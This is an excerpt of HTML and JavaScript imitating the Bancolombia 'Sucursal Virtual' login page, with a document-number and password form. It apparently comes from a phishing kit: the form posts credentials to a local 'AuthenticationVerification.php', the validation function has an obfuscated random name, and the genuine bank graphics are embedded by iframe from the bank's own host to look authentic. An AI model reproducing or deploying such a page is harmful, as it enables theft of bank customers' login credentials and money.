...
<script language="JavaScript">
	...
	function xivfIUmYxNmh(){     	if (validBrowser()) {  	hideUserID();       		var userId=document.authenticationForm.userId.value;     		var password=document.authenticationForm.password.value;       		for(var i=userId.search(" "); i!=-1; i=userId.search(" ")){     		i=userId.search(" ");     		var tmp = userId.substring(0,i);       		userId = tmp + userId.substring(i+1,userId.length);  		}   		if(isEmpty(userId) || isEmpty(password)) {            		alert('Por favor, ingresar su número de Documento y su Clave.');         	} else if (isNaN(userId) ) { 			alert('Por favor, ingresar su número de Documento y su Clave.');            	} else if (passwordMinLength[0] < DEF_MAXLENGTH - 1){      			alert('La clave debe ser de al menos 4 dígitos. Por favor rectifique e intente nuevamente.');      			clearKeys();    			document.authenticationForm.password.value="";   	 	} 		else {           	top.withNotify=true;                 return true;         }      } 	document.authenticationForm.tempUserID.focus();   	return false;  }
	...
	<script language="JavaScript">
		...
		//Agrega los logos en la parte superior de la página
		...
		<td>
			<table border="0" cellspacing="0" cellpadding="0" background="../images/fondo_title.gif">
              <tr height="20"> 
                ...
                <td align="left" valign="middle" class="tituloppal" nowrap>&nbsp;Inicio - Sucursal Virtual&nbsp;</td>
	...
	<table width="98%" border="0" align="center">  
      <form name="authenticationForm" method="POST" action="AuthenticationVerification.php">	     	
			...
			<tr>
    			...
    			<td width="150" valign=top>
        			<table border="0" cellspacing="0" cellpadding="2">
		            	<tr>
                			<td class="contentA2" height="23" nowrap colspan=2>
                    			<table>
                        			<tr>
                            			<td nowrap="nowrap">
		                                	Por favor digite su 
                        		  	...
                        		  	<tr>
                              			<td nowrap>
						                   	<a href="javascript:popup_help('92')" class="acctlink">Documento de Identidad</a>
						               	</td>
						           	</tr>
						       	</table>
						   	</td>
						...
						<tr>
						   	<td class="contentA2" colspan=2>
						   		<input type="hidden" name="userId" value="">         
						   		<input type="text" name="tempUserID" maxlength="20" size="20" value="" onfocus="this.value='';" autocomplete="off">
						   	</td>
						</tr>
						<tr>
						 	<td class="contentA2" id="sinB" height="23" colspan=2 nowrap>

								Por favor digite su  
								<a href="javascript:popup_help('16')" class="acctlink">Clave</a>
				        	</td>
				     	</tr>
				     	<tr>
					       	<td class="contentA2" width="10">
								<input type="password" name="password" size="4" tabindex="2" value="" readonly="readonly" autocomplete="off">								
							</td>
				          	<td align="right">
       					...
       					<tr>
				           	<td class="contentA2" colspan=2>&nbsp;</td>
				       	</tr>
				   	</table>
				</td>
				<td rowspan="2" valign=top align="left" width="150">
	         	...
	         	<td rowspan="4" valign=top>
					<IFRAME FRAMEBORDER="0" VALIGN="middle" SCROLLING="no" WIDTH="350" HEIGHT="270" SRC="https://bancolombia.olb.todo1.com/content/BOLP/Bancolombia/login_BOLP_BC_zonaA.gif"></IFRAME>
		       	</td>
			</tr>
			<tr>
				<td>&nbsp;</td>
       		...
       		<tr>
       			<td colspan="2">
		           	<table border="0" width="95%" cellspacing="0" cellpadding="0">
               			<tr>
                   			<td height="30" nowrap>
							  	<a href="javascript:disabledTimeout()" class="acctlink">Generar su clave personal</a> &nbsp;&nbsp;
							</td>

							<td height="30" nowrap>
		                       	<a href="javascript:popup_helpLoginForgotPassword()" class="acctlink">&#191;No puede conectarse?</a> &nbsp;&nbsp;
        		           	</td>
                		</tr>
                	</table>
    	     	</td>
		...
		<table align="center" width="96%">
			...
			<tr>
				<td nowrap="nowrap">
					No conoce la Sucursal Virtual Personas de Bancolombia?  <a href="#" class="acctlink" onClick="javascript:popUpDemo('/olb/GeneralDispatch?fwd=demoSelected');"> Ver DEMO</a> &nbsp;&nbsp;
		...
		<table align="center" width="96%" border="0" cellspacing="0" cellpadding="0">
			<tr>
        		<td>
					<IFRAME FRAMEBORDER="0" VALIGN="top" SCROLLING="no" WIDTH=670 HEIGHT=170 SRC="../images/BlobServer2.gif"></IFRAME>
...
<table border="0" width="95%" cellspacing="0" cellpadding="0" align="center">	
    <tr align="center">
	    ...
	    <td>
	      <font size="1">COPYRIGHTS (c) 2000 - 2008
			 TODO1 SERVICES, INC. Todos los derechos reservados.</font>
	    </td>
	</tr>	
</table>
...
<script type="text/javascript" language="JavaScript">
  <!--
  var focusControl = document.forms["authenticationForm"].elements["tempUserID"];
